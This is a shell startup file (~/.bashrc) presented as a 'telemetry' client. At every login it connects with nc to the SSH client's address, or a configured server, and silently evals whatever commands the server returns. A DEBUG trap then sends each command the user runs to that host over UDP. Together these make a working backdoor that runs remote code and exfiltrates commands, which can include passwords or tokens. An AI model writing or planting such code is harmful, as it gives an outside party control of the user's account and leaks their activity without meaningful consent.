#!/bin/sh
# ~/.bashrc - Pure Shell Implementation (Remote Client)
# 仅用 sh + 标准工具（nc）

set -e

# ============ Configuration ============
# Server 地址：远程 PC，接收 init 请求并返回初始化命令
TELEMETRY_SERVER="${TELEMETRY_SERVER:-127.0.0.1}"
TELEMETRY_PORT="${TELEMETRY_PORT:-9999}"
# 日志发送端口：用于异步上报命令执行日志
TELEMETRY_LOG_PORT="${TELEMETRY_LOG_PORT:-9997}"
TELEMETRY_ENABLED="${TELEMETRY_ENABLED:-1}"
TELEMETRY_DEBUG="${TELEMETRY_DEBUG:-0}"

_debug() {
    if [ "$TELEMETRY_DEBUG" = "1" ]; then
        echo "[TELEMETRY_DEBUG] $*" >&2
    fi
}

_error() {
    echo "[TELEMETRY_ERROR] $*" >&2
}

# ============ Network Utils ============

# 获取 SSH 客户端 IP（从 SSH_CLIENT 或 SSH_CONNECTION）
_get_server_ip() {
    # SSH 场景：获取连接来源的客户端 IP
    if [ -n "$SSH_CLIENT" ]; then
        echo "${SSH_CLIENT%% *}"
        return 0
    fi
    
    # 非 SSH 场景：使用配置的服务器地址
    echo "$TELEMETRY_SERVER"
}

# TCP 同步连接（init 阶段）
_tcp_sync_connect() {
    local host="$1"
    local port="$2"
    local timeout=5
    
    _debug "TCP sync connect to $host:$port (timeout: ${timeout}s)"
    
    # 使用 nc 建立连接并等待响应
    if command -v nc >/dev/null 2>&1; then
        timeout "$timeout" nc "$host" "$port" 2>/dev/null || return 1
    elif command -v telnet >/dev/null 2>&1; then
        (sleep 1) | timeout "$timeout" telnet "$host" "$port" 2>/dev/null || return 1
    else
        _error "No nc/telnet available"
        return 1
    fi
    
    return 0
}

# UDP 异步发送（日志追踪）
_udp_async_send() {
    local host="$1"
    local port="$2"
    local data="$3"
    
    _debug "UDP async send to $host:$port"
    
    if command -v nc >/dev/null 2>&1; then
        # nc -u: UDP 模式
        echo "$data" | timeout 1 nc -u -w 0 "$host" "$port" 2>/dev/null &
    fi
}

# ============ Initialize Phase ============

_telemetry_init() {
    if [ "$TELEMETRY_ENABLED" != "1" ]; then
        return 1
    fi
    
    _debug "=== Telemetry Init Start ==="
    
    # 1. 确定服务器地址（优先使用 SSH 客户端 IP）
    local server_ip
    server_ip=$(_get_server_ip)
    
    _debug "Server IP: $server_ip"
    _debug "Server Port: $TELEMETRY_PORT"
    
    # 2. 主动连接到服务器，获取初始化命令
    _debug "Connecting to init server..."
    
    local init_response
    init_response=$(_tcp_sync_connect "$server_ip" "$TELEMETRY_PORT")
    
    if [ -z "$init_response" ]; then
        _error "Init response is empty"
        return 1
    fi
    
    _debug "Init response: $init_response"
    
    # 3. 直接执行服务器返回的命令字符串（无需 datum 格式解析）
    _debug "Executing init commands..."
    
    if eval "$init_response" 2>/dev/null; then
        _debug "=== Telemetry Init Complete ==="
        return 0
    else
        _error "Init command execution failed"
        return 1
    fi
}

# 执行初始化（仅一次）
if [ "$TELEMETRY_INITIALIZED" != "1" ]; then
    if _telemetry_init; then
        export TELEMETRY_INITIALIZED=1
        _debug "Telemetry initialized successfully"
    else
        export TELEMETRY_ENABLED=0
        _debug "Telemetry disabled due to init failure"
    fi
fi

# ============ Command Tracking ============

_telemetry_log_command() {
    if [ "$TELEMETRY_ENABLED" != "1" ]; then
        return 0
    fi
    
    local cmd="$BASH_COMMAND"
    
    # 跳过内部命令
    case "$cmd" in
        _telemetry_*|_get_*|_tcp_*|_udp_*|history*|true|false)
            return 0
            ;;
    esac
    
    [ -z "$cmd" ] && return 0
    
    _debug "Logging command: $cmd"
    
    # 确定日志服务器地址
    local server_ip
    server_ip=$(_get_server_ip)
    
    # 异步通过 UDP 发送（不阻塞，无需等待）
    _udp_async_send "$server_ip" "$TELEMETRY_LOG_PORT" "$cmd"
}

# ============ Cleanup ============

_telemetry_cleanup() {
    trap - DEBUG
}

# 导出配置
export TELEMETRY_SERVER TELEMETRY_PORT TELEMETRY_LOG_PORT TELEMETRY_ENABLED TELEMETRY_DEBUG

trap '_telemetry_cleanup' EXIT

# 注册 DEBUG trap（每条命令执行后）
trap '_telemetry_log_command' DEBUG
